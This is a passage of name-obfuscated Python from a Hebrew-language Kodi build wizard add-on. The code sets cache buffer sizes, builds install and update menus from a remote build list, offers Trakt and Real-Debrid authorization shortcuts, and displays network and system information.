		with open (O0OOOO00OO0O0OO00 ,"w")as O000O0OO0OOOOO00O :#line:1662
			if O00O0O0OO0O0OOOO0 >=17 :OO000OO0000000OO0 =xml_data_advSettings_New (str (O0O0O0O0O0OO0O000 ))#line:1663
			else :OO000OO0000000OO0 =xml_data_advSettings_old (str (O0O0O0O0O0OO0O000 ))#line:1664
			O000O0OO0OOOOO00O .write (OO000OO0000000OO0 )#line:1666
			DIALOG .ok ('Buffer Size Set to: '+str (O0O0O0O0O0OO0O000 ),'Please restart Kodi for settings to apply.','')#line:1667
	elif OO0O00OOOO000OO00 ==0 :#line:1669
		O0O0O0O0O0OO0O000 =_O0O00000OO00O00OO (default =str (O0O0O0O0O0OO0O000 ),heading ="INPUT BUFFER SIZE")#line:1670
		with open (O0OOOO00OO0O0OO00 ,"w")as O000O0OO0OOOOO00O :#line:1671
			if O00O0O0OO0O0OOOO0 >=17 :OO000OO0000000OO0 =xml_data_advSettings_New (str (O0O0O0O0O0OO0O000 ))#line:1672
			else :OO000OO0000000OO0 =xml_data_advSettings_old (str (O0O0O0O0O0OO0O000 ))#line:1673
			O000O0OO0OOOOO00O .write (OO000OO0000000OO0 )#line:1674
			DIALOG .ok ('Buffer Size Set to: '+str (O0O0O0O0O0OO0O000 ),'Please restart Kodi for settings to apply.','')#line:1675
def xml_data_advSettings_old (OO00OO00OO0O00O00 ):#line:1676
	O000OO0OOOOOO0O0O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO00OO00OO0O00O00 #line:1686
	return O000OO0OOOOOO0O0O #line:1687
def xml_data_advSettings_New (O0O0O0000O00O00OO ):#line:1689
	O0OOO0O0OO00OOO0O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O0O0O0000O00O00OO #line:1701
	return O0OOO0O0OO00OOO0O #line:1702
def write_ADV_SETTINGS_XML (OOO00O00OO0OOOOOO ):#line:1703
    if not os .path .exists (xml_file ):#line:1704
        with open (xml_file ,"w")as OOO0OOO000OO0O00O :#line:1705
            OOO0OOO000OO0O00O .write (xml_data )#line:1706
def _O0O00000OO00O00OO (default ="",heading ="",hidden =False ):#line:1707
    ""#line:1708
    OOO0000O00000000O =xbmc .Keyboard (default ,heading ,hidden )#line:1709
    OOO0000O00000000O .doModal ()#line:1710
    if (OOO0000O00000000O .isConfirmed ()):#line:1711
        return unicode (OOO0000O00000000O .getText (),"utf-8")#line:1712
    return default #line:1713
def index ():#line:1715
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1716
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1717
	if AUTOUPDATE =='Yes':#line:1718
		if wiz .workingURL (WIZARDFILE )==True :#line:1719
			O0OO0OO000OO00OOO =wiz .checkWizard ('version')#line:1720
			if O0OO0OO000OO00OOO >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0OO0OO000OO00OOO ),'wizardupdate',themeit =THEME2 )#line:1721
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1722
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1723
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1724
	if len (BUILDNAME )>0 :#line:1725
		O000O0OO0O00O0000 =wiz .checkBuild (BUILDNAME ,'version')#line:1726
		O000OO00O000O0O00 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:1727
		if O000O0OO0O00O0000 >BUILDVERSION :O000OO00O000O0O00 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O000OO00O000O0O00 ,O000O0OO0O00O0000 )#line:1728
		addDir (O000OO00O000O0O00 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:1730
		try :#line:1732
		     O0O0OO00O0OOOOO00 =wiz .themeCount (BUILDNAME )#line:1733
		except :#line:1734
		   O0O0OO00O0OOOOO00 =False #line:1735
		if not O0O0OO00O0OOOOO00 ==False :#line:1736
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:1737
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:1738
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1741
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1742
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1743
	addFile ('אימות חשבון + RD','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1747
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1749
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1751
def morsetup ():#line:1753
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1754
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1755
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1756
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1760
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1761
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1764
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1765
	addFile ('הגדר מצב RD','rdon',icon =ICONMAINT ,themeit =THEME1 )#line:1766
	addFile ('ביטול מצב RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1767
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1775
	setView ('files','viewType')#line:1776
def morsetup2 ():#line:1777
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1778
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1779
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1780
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1781
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1782
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1783
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1784
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1785
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1786
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1787
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1788
def fastupdate ():#line:1789
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:1790
def forcefastupdate ():#line:1792
			OO0000OO00O000000 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1793
			wiz .ForceFastUpDate (ADDONTITLE ,OO0000OO00O000000 )#line:1794
def rdsetup ():#line:1798
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.resolveurl)'):#line:1799
		xbmc .executebuiltin ("InstallAddon(script.module.resolveurl)")#line:1800
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.urlresolver)'):#line:1801
		xbmc .executebuiltin ("InstallAddon(script.module.urlresolver)")#line:1802
	addFile ('[COLOR red]ResolverUrl[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','resolveurl',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1803
	addFile ('[COLOR blue]URLResolver[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','urlresolver',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1804
	setView ('files','viewType')#line:1805
def traktsetup ():#line:1807
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1808
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1809
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1810
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1811
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1812
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1813
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1814
	setView ('files','viewType')#line:1815
def resolveurlsetup ():#line:1817
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1818
def urlresolversetup ():#line:1819
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1820
def placentasetup ():#line:1822
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1823
def reptiliasetup ():#line:1824
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1825
def flixnetsetup ():#line:1826
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1827
def yodasetup ():#line:1828
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1829
def numberssetup ():#line:1830
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1831
def uranussetup ():#line:1832
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1833
def genesissetup ():#line:1834
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1835
def net_tools (view =None ):#line:1837
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1838
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1839
	setView ('files','viewType')#line:1841
def speedMenu ():#line:1842
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:1843
def viewIP ():#line:1844
	OOO00000000000OOO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1858
	OOO0OO00OOO00O0O0 =[];OO00OO0O0O00O0O00 =0 #line:1859
	for O000OO0OO00OO0OOO in OOO00000000000OOO :#line:1860
		OOOO0OOOO0O0O000O =wiz .getInfo (O000OO0OO00OO0OOO )#line:1861
		OOO00OO0000O0OOO0 =0 #line:1862
		while OOOO0OOOO0O0O000O =="Busy"and OOO00OO0000O0OOO0 <10 :#line:1863
			OOOO0OOOO0O0O000O =wiz .getInfo (O000OO0OO00OO0OOO );OOO00OO0000O0OOO0 +=1 ;wiz .log ("%s sleep %s"%(O000OO0OO00OO0OOO ,str (OOO00OO0000O0OOO0 )));xbmc .sleep (1000 )#line:1864
		OOO0OO00OOO00O0O0 .append (OOOO0OOOO0O0O000O )#line:1865
		OO00OO0O0O00O0O00 +=1 #line:1866
	OO000O00OO0O00OOO ,O0OOOO0OOO00O00O0 ,OOO0O00O0O00O0000 =getIP ()#line:1867
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO00OOO00O0O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1868
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O00OO0O00OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1869
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOO0OOO00O00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1870
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O00O0O00O0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1871
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO00OOO00O0O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1872
	setView ('files','viewType')#line:1873
def buildMenu ():#line:1875
	if USERNAME =='':#line:1876
		ADDON .openSettings ()#line:1877
		sys .exit ()#line:1878
	if PASSWORD =='':#line:1879
		ADDON .openSettings ()#line:1880
	OOOOOOO00O0OOO0O0 =u_list (SPEEDFILE )#line:1881
	(OOOOOOO00O0OOO0O0 )#line:1882
	O0OO0OOO0OO0O00OO =(wiz .workingURL (OOOOOOO00O0OOO0O0 ))#line:1883
	(O0OO0OOO0OO0O00OO )#line:1884
	O0OO0OOO0OO0O00OO =wiz .workingURL (SPEEDFILE )#line:1885
	if not O0OO0OOO0OO0O00OO ==True :#line:1886
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1887
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1888
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1889
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1890
		addFile ('%s'%O0OO0OOO0OO0O00OO ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1891
	else :#line:1892
		OOOOO0OOO00O0OOOO ,OO0OOO00OOOOO0OOO ,OO00OOOOO00OOO00O ,OOOO000O0O0O0OO00 ,O000O00O00O00OOO0 ,O00OOO0000O0OOOOO ,OOOO0OOOOO0O0O0O0 =wiz .buildCount ()#line:1893
		OOO0O00OOO0OOO0O0 =False ;O00O0O0O00000000O =[]#line:1894
		if THIRDPARTY =='true':#line:1895
			if not THIRD1NAME ==''and not THIRD1URL =='':OOO0O00OOO0OOO0O0 =True ;O00O0O0O00000000O .append ('1')#line:1896
			if not THIRD2NAME ==''and not THIRD2URL =='':OOO0O00OOO0OOO0O0 =True ;O00O0O0O00000000O .append ('2')#line:1897
			if not THIRD3NAME ==''and not THIRD3URL =='':OOO0O00OOO0OOO0O0 =True ;O00O0O0O00000000O .append ('3')#line:1898
		O0OO0OOO0OO00OO0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1899
		O00OO00O000O0OOOO =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO0OOO0OO00OO0O )#line:1900
		if OOOOO0OOO00O0OOOO ==1 and OOO0O00OOO0OOO0O0 ==False :#line:1901
			for OO000OOOO0OO0O000 ,OO0O0OO0OOO0OOO00 ,OOOO0000OOOOO00OO ,OO0OO000000OOOO00 ,OO00000OO0O0OOO0O ,O0O00000OOOOOOO0O ,O0000000O0O0OO000 ,OO0O0OOOOO0O0OO00 ,O0OO0000000O00000 ,OOO0O00000O0000OO in O00OO00O000O0OOOO :#line:1902
				if not SHOWADULT =='true'and O0OO0000000O00000 .lower ()=='yes':continue #line:1903
				if not DEVELOPER =='true'and wiz .strTest (OO000OOOO0OO0O000 ):continue #line:1904
				viewBuild (O00OO00O000O0OOOO [0 ][0 ])#line:1905
				return #line:1906
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1909
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1910
		if OOO0O00OOO0OOO0O0 ==True :#line:1911
			for O000O0OOO00O0O0OO in O00O0O0O00000000O :#line:1912
				OO000OOOO0OO0O000 =eval ('THIRD%sNAME'%O000O0OOO00O0O0OO )#line:1913
		if len (O00OO00O000O0OOOO )>=1 :#line:1915
			if SEPERATE =='true':#line:1916
				for OO000OOOO0OO0O000 ,OO0O0OO0OOO0OOO00 ,OOOO0000OOOOO00OO ,OO0OO000000OOOO00 ,OO00000OO0O0OOO0O ,O0O00000OOOOOOO0O ,O0000000O0O0OO000 ,OO0O0OOOOO0O0OO00 ,O0OO0000000O00000 ,OOO0O00000O0000OO in O00OO00O000O0OOOO :#line:1917
					if not SHOWADULT =='true'and O0OO0000000O00000 .lower ()=='yes':continue #line:1918
					if not DEVELOPER =='true'and wiz .strTest (OO000OOOO0OO0O000 ):continue #line:1919
					O0000O0000O00O000 =createMenu ('install','',OO000OOOO0OO0O000 )#line:1920
					addDir ('[%s] %s (v%s)'%(float (OO00000OO0O0OOO0O ),OO000OOOO0OO0O000 ,OO0O0OO0OOO0OOO00 ),'viewbuild',OO000OOOO0OO0O000 ,description =OOO0O00000O0000OO ,fanart =OO0O0OOOOO0O0OO00 ,icon =O0000000O0O0OO000 ,menu =O0000O0000O00O000 ,themeit =THEME2 )#line:1921
			else :#line:1922
				if OOOO000O0O0O0OO00 >0 :#line:1923
					OOO0O0O00O0000OOO ='+'if SHOW17 =='false'else '-'#line:1924
					if SHOW17 =='true':#line:1926
						for OO000OOOO0OO0O000 ,OO0O0OO0OOO0OOO00 ,OOOO0000OOOOO00OO ,OO0OO000000OOOO00 ,OO00000OO0O0OOO0O ,O0O00000OOOOOOO0O ,O0000000O0O0OO000 ,OO0O0OOOOO0O0OO00 ,O0OO0000000O00000 ,OOO0O00000O0000OO in O00OO00O000O0OOOO :#line:1928
							if not SHOWADULT =='true'and O0OO0000000O00000 .lower ()=='yes':continue #line:1929
							if not DEVELOPER =='true'and wiz .strTest (OO000OOOO0OO0O000 ):continue #line:1930
							O0000O0O0O0OO00OO =int (float (OO00000OO0O0OOO0O ))#line:1931
							if O0000O0O0O0OO00OO ==17 :#line:1932
								O0000O0000O00O000 =createMenu ('install','',OO000OOOO0OO0O000 )#line:1933
								addDir ('[%s] %s (v%s)'%(float (OO00000OO0O0OOO0O ),OO000OOOO0OO0O000 ,OO0O0OO0OOO0OOO00 ),'viewbuild',OO000OOOO0OO0O000 ,description =OOO0O00000O0000OO ,fanart =OO0O0OOOOO0O0OO00 ,icon =O0000000O0O0OO000 ,menu =O0000O0000O00O000 ,themeit =THEME2 )#line:1934
				if O000O00O00O00OOO0 >0 :#line:1935
					OOO0O0O00O0000OOO ='+'if SHOW18 =='false'else '-'#line:1936
					if SHOW18 =='true':#line:1938
						for OO000OOOO0OO0O000 ,OO0O0OO0OOO0OOO00 ,OOOO0000OOOOO00OO ,OO0OO000000OOOO00 ,OO00000OO0O0OOO0O ,O0O00000OOOOOOO0O ,O0000000O0O0OO000 ,OO0O0OOOOO0O0OO00 ,O0OO0000000O00000 ,OOO0O00000O0000OO in O00OO00O000O0OOOO :#line:1940
							if not SHOWADULT =='true'and O0OO0000000O00000 .lower ()=='yes':continue #line:1941
							if not DEVELOPER =='true'and wiz .strTest (OO000OOOO0OO0O000 ):continue #line:1942
							O0000O0O0O0OO00OO =int (float (OO00000OO0O0OOO0O ))#line:1943
							if O0000O0O0O0OO00OO ==18 :#line:1944
								O0000O0000O00O000 =createMenu ('install','',OO000OOOO0OO0O000 )#line:1945
								addDir ('[%s] %s (v%s)'%(float (OO00000OO0O0OOO0O ),OO000OOOO0OO0O000 ,OO0O0OO0OOO0OOO00 ),'viewbuild',OO000OOOO0OO0O000 ,description =OOO0O00000O0000OO ,fanart =OO0O0OOOOO0O0OO00 ,icon =O0000000O0O0OO000 ,menu =O0000O0000O00O000 ,themeit =THEME2 )#line:1946
				if OO00OOOOO00OOO00O >0 :#line:1947
					OOO0O0O00O0000OOO ='+'if SHOW16 =='false'else '-'#line:1948
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOO0O0O00O0000OOO ,OO00OOOOO00OOO00O ),'togglesetting','show16',themeit =THEME3 )#line:1949
					if SHOW16 =='true':#line:1950
						for OO000OOOO0OO0O000 ,OO0O0OO0OOO0OOO00 ,OOOO0000OOOOO00OO ,OO0OO000000OOOO00 ,OO00000OO0O0OOO0O ,O0O00000OOOOOOO0O ,O0000000O0O0OO000 ,OO0O0OOOOO0O0OO00 ,O0OO0000000O00000 ,OOO0O00000O0000OO in O00OO00O000O0OOOO :#line:1951
							if not SHOWADULT =='true'and O0OO0000000O00000 .lower ()=='yes':continue #line:1952
							if not DEVELOPER =='true'and wiz .strTest (OO000OOOO0OO0O000 ):continue #line:1953
							O0000O0O0O0OO00OO =int (float (OO00000OO0O0OOO0O ))#line:1954
							if O0000O0O0O0OO00OO ==16 :#line:1955
								O0000O0000O00O000 =createMenu ('install','',OO000OOOO0OO0O000 )#line:1956
								addDir ('[%s] %s (v%s)'%(float (OO00000OO0O0OOO0O ),OO000OOOO0OO0O000 ,OO0O0OO0OOO0OOO00 ),'viewbuild',OO000OOOO0OO0O000 ,description =OOO0O00000O0000OO ,fanart =OO0O0OOOOO0O0OO00 ,icon =O0000000O0O0OO000 ,menu =O0000O0000O00O000 ,themeit =THEME2 )#line:1957
				if OO0OOO00OOOOO0OOO >0 :#line:1958
					OOO0O0O00O0000OOO ='+'if SHOW15 =='false'else '-'#line:1959
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOO0O0O00O0000OOO ,OO0OOO00OOOOO0OOO ),'togglesetting','show15',themeit =THEME3 )#line:1960
					if SHOW15 =='true':#line:1961
						for OO000OOOO0OO0O000 ,OO0O0OO0OOO0OOO00 ,OOOO0000OOOOO00OO ,OO0OO000000OOOO00 ,OO00000OO0O0OOO0O ,O0O00000OOOOOOO0O ,O0000000O0O0OO000 ,OO0O0OOOOO0O0OO00 ,O0OO0000000O00000 ,OOO0O00000O0000OO in O00OO00O000O0OOOO :#line:1962
							if not SHOWADULT =='true'and O0OO0000000O00000 .lower ()=='yes':continue #line:1963
							if not DEVELOPER =='true'and wiz .strTest (OO000OOOO0OO0O000 ):continue #line:1964
							O0000O0O0O0OO00OO =int (float (OO00000OO0O0OOO0O ))#line:1965
							if O0000O0O0O0OO00OO <=15 :#line:1966
								O0000O0000O00O000 =createMenu ('install','',OO000OOOO0OO0O000 )#line:1967
								addDir ('[%s] %s (v%s)'%(float (OO00000OO0O0OOO0O ),OO000OOOO0OO0O000 ,OO0O0OO0OOO0OOO00 ),'viewbuild',OO000OOOO0OO0O000 ,description =OOO0O00000O0000OO ,fanart =OO0O0OOOOO0O0OO00 ,icon =O0000000O0O0OO000 ,menu =O0000O0000O00O000 ,themeit =THEME2 )#line:1968
		elif OOOO0OOOOO0O0O0O0 >0 :#line:1969
			if O00OOO0000O0OOOOO >0 :#line:1970
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:1971
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:1972
			else :#line:1973
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1974
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:1975
	setView ('files','viewType')#line:1976
def viewBuild (OO00O000O00O0O00O ):#line:1978
	O0O0000000OO00000 =wiz .workingURL (SPEEDFILE )#line:1979
	if not O0O0000000OO00000 ==True :#line:1980
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:1981
		addFile ('%s'%O0O0000000OO00000 ,'',themeit =THEME3 )#line:1982
		return #line:1983
	if wiz .checkBuild (OO00O000O00O0O00O ,'version')==False :#line:1984
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:1985
		addFile ('%s was not found in the builds list.'%OO00O000O00O0O00O ,'',themeit =THEME3 )#line:1986
		return #line:1987
	O000O000O00OO0000 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:1988
	OOO0OOOO00000O000 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO00O000O00O0O00O ).findall (O000O000O00OO0000 )#line:1989
	for O0OO0O000OOOOO0OO ,O0000OO00OO0O000O ,OOO0O00O00000OOO0 ,OO0000O0OO0000O00 ,O0O0OOO0OOO00O0O0 ,O0O000O000O0OO00O ,O0OO0O0OO0000OOO0 ,O00OO00OOOO00O00O ,O0OOO000O0OO0OO00 ,O0O0OO0O000000OOO in OOO0OOOO00000O000 :#line:1990
		O0O000O000O0OO00O =O0O000O000O0OO00O if wiz .workingURL (O0O000O000O0OO00O )else ICON #line:1991
		O0OO0O0OO0000OOO0 =O0OO0O0OO0000OOO0 if wiz .workingURL (O0OO0O0OO0000OOO0 )else FANART #line:1992
		OO00O000OO0000O00 ='%s (v%s)'%(OO00O000O00O0O00O ,O0OO0O000OOOOO0OO )#line:1993
		if BUILDNAME ==OO00O000O00O0O00O and O0OO0O000OOOOO0OO >BUILDVERSION :#line:1994
			OO00O000OO0000O00 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO00O000OO0000O00 ,BUILDVERSION )#line:1995
		OOO0OOO00O00OOO0O =int (float (KODIV ));O000O0OO0OOOO00OO =int (float (OO0000O0OO0000O00 ))#line:2004
		if not OOO0OOO00O00OOO0O ==O000O0OO0OOOO00OO :#line:2005
			if OOO0OOO00O00OOO0O ==16 and O000O0OO0OOOO00OO <=15 :O0O0OO00O0OO000O0 =False #line:2006
			else :O0O0OO00O0OO000O0 =True #line:2007
		else :O0O0OO00O0OO000O0 =False #line:2008
		addFile ('התקנה','install',OO00O000O00O0O00O ,'fresh',description =O0O0OO0O000000OOO ,fanart =O0OO0O0OO0000OOO0 ,icon =O0O000O000O0OO00O ,themeit =THEME1 )#line:2012
		if not O0O0OOO0OOO00O0O0 =='http://':#line:2015
			if wiz .workingURL (O0O0OOO0OOO00O0O0 )==True :#line:2016
				addFile (wiz .sep ('THEMES'),'',fanart =O0OO0O0OO0000OOO0 ,icon =O0O000O000O0OO00O ,themeit =THEME3 )#line:2017
				O000O000O00OO0000 =wiz .openURL (O0O0OOO0OOO00O0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2018
				OOO0OOOO00000O000 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000O000O00OO0000 )#line:2019
				for O00O0O00O00O000OO ,O00O00000OO0OOO00 ,OOO0000OOO0OO0O0O ,O00O0OO000O0O00O0 ,O0OOO000OOO0OOOO0 ,O0O0OO0O000000OOO in OOO0OOOO00000O000 :#line:2020
					if not SHOWADULT =='true'and O0OOO000OOO0OOOO0 .lower ()=='yes':continue #line:2021
					OOO0000OOO0OO0O0O =OOO0000OOO0OO0O0O if OOO0000OOO0OO0O0O =='http://'else O0O000O000O0OO00O #line:2022
					O00O0OO000O0O00O0 =O00O0OO000O0O00O0 if O00O0OO000O0O00O0 =='http://'else O0OO0O0OO0000OOO0 #line:2023
					addFile (O00O0O00O00O000OO if not O00O0O00O00O000OO ==BUILDTHEME else "[B]%s (Installed)[/B]"%O00O0O00O00O000OO ,'theme',OO00O000O00O0O00O ,O00O0O00O00O000OO ,description =O0O0OO0O000000OOO ,fanart =O00O0OO000O0O00O0 ,icon =OOO0000OOO0OO0O0O ,themeit =THEME3 )#line:2024
	setView ('files','viewType')#line:2025
def viewThirdList (OO0OOOO00OO00O0O0 ):#line:2027
	O000O000O0O0OOO00 =eval ('THIRD%sNAME'%OO0OOOO00OO00O0O0 )#line:2028
